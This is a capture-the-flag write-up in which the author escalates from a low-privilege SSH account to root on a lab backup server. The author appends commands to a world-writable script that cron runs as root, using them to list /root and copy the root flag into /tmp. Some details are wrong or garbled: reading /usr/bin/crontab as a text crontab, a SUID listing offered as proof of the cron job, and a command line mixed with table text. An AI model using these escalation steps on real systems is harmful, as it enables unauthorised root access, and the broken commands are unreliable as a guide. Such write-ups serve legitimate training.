# Scheduled Sabotage - CTF Writeup

Date: 10 Nov 2026 20:50 EST

## The Scenario
I have been hired as a security consultant to audit a company's backup server.  A backup server runs normally, running automated maintenance tasks on schedule. I need to find out if the scheduled tasks are secure and identify any security misconfigurations. There is a cron job that runs every minute.

## Approach
The system administrator has provided the SSH credentials to a low privilege account. I will ssh into the target system, and enumerate the system to discover any misconfiguration that will lead to a complete system compromise.

Objective:
Find the User Flag: Enumerate the system and locate flag-user.txt.
Find the Root Flag: Identify and exploit a privilege escalation vulnerability to gain root access and read flag-root.txt.

## Findings

Once I logged into the target system, the user flag was located by using the find command or by just enumerating through the folders for it:
In the users directory I used:

```bash
find . -iname "flag*" 2>/dev/null
```

This quickly found the flag
```bash
/<redacted>/<redacted>/data/flag-user.txt
```

Then a trivial command to read the file and confirm it matched the Flag UUID format

```bash
$ cat flag-user.txt 
xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (actual flag output redacted)
```

### First objective completed and the user flag was captured

### Now onto finding the misconfiguration
As I knew cron was running the maintenance job, I first verified this:

Enumerate SUID binaries flagged s in the owner execute slot.
```bash
$ find / -perm -4000 -type f 2>/dev/null
-rwsr-x---  1 root  wheel  67320 May 30 2024 crontab
```
This confirmed that the "s" is in the execution bit

Then reviewed the crontab file with `cat /usr/bin/crontab`

```bash
# System maintenance tasks
* * * * * root /bin/sh /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh >> /var/log/maintenance/system_check.log 2>&1
```
This confirmed the location and script that was run, and the location of where the output is sent.

I then enumerated the script file and viewed the contents
```bash
$ ls -la /XXX/XXXXXXXXXX/scripts/xxxxxx_xxxxx.sh
$  -rwxrwxrwx    1 root     root          1012 Nov 11 02:05 /XXXXXX/XXXXXXXXZXZ/scripts/xxxxxx_xxxxx.sh
$ cat /XXXXXX/XXXXXXXXZXZ/scripts/xxxxxx_xxxxx.sh
```
This is the misconfiguration, as the script has full world `rwx` privilege.

For a quick test I made sure I could actually write a command to the script file, and verify cron ran it successfully, and create a file in the `/tmp` folder.  **A quick note here**: `/var/log` had the `noexec` mount/directroy so I could not execute a command there if I needed to later in this process (i.e., to run a shell), as it turned out I didn't need it.
```bash
$ echo 'id > /tmp/proof.txt' >> /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh
```
After 60 seconds the file proof.txt appeared in the /tmp directory
As it turns out the `/tmp` directory also had the `noexec` mount, so I couldn't send a executable command there.


Just in case I needed to find a mount/directory that didn't have a `noexec` mount.  As I stated above, I didn't need to run any shell after all, but as a exercise in completeness I did this anyway.

I searched all mount point for this
```bash
$ grep -v noexec /proc/mounts
```
Which showed a mount using the same as the directory that the script was located
```bash
$ df /<redacted>/<redacted>/scripts/
Filesystem           1K-blocks      Used Available Use% Mounted on
<redacted>              21498384   2770576  17610420  14% /
```

My simple approach was to first see if I could enumerate the root directory and then the review to see if I could find the flag file

Using the following command I was able to perform a Remote Code Execution (RCE)
```bash
$ echo 'ls -la /root > /tmp/root_dir.txt; chmod 644 /tmp/root_dir.txt' >> /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh
```
After the 60 seconds, this created a file in the `/tmp` directory of the target system root directory
A simple command `cat` to read it and the flag file was visible

```bash
cat /tmp/Confirm cron was executing a script or other method | locate the script |
drwx------    1 root     root          4096 Nov 11 01:51 .
drwxr-xr-x    1 root     root          4096 Nov 11 01:13 ..
drwx------    2 root     root          4096 Nov 11 01:51 .ssh
-rw-------    1 root     root            37 Jan 21  2026 flag-root.txt
```
Next up was to create a file with the context of flag-root.txt

```bash
echo 'cat /root/flag-root.txt > /tmp/flag_dump.txt; chmod 644 /tmp/flag_dump.txt' >> /redacted/redacted/scripts/xxxxxx_xxxxx.sh
```

After 60 seconds all that was left was to read the '/tmp/flag_dump.txt' the script created, to read the contents of the flag-root.txt
```bash
$ cat /tmp/flag_dump.txt
xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (actual flag output redacted)
```


## Timeline
| Step | Action | Evidence |
|------|--------|----------|
| 1 | ssh into the system | locate the user flag|
| 2 | Locate and read the user flag | Using find or simply navigating to the file in the user directory |
| 3 | Confirm cron was executing a script or other method | locate the script |
| 4 | Confirm I could edit the script | Edit the script to get the directory structure of the root account |
| 5 | Send the output of the root directory to the /tmp directory | cat the root_dir.txt file to view and  location of the root flag |
| 6 | Read the dumped root file and find the flag file location | Run another script to create a flag_dump.txt in /tmp and read it |


## Takeaway
This is a classic file misconfiguration privilege escalation, an administrator set an world writeable (777) permission on the script.  This should only have had write access to root.


This CTF demonstrates my ability to use Linux, SSH, file Enumeration, view and understand cron job configuration, creating a Privilege Escalation and do the final Analysis in locating the flaw.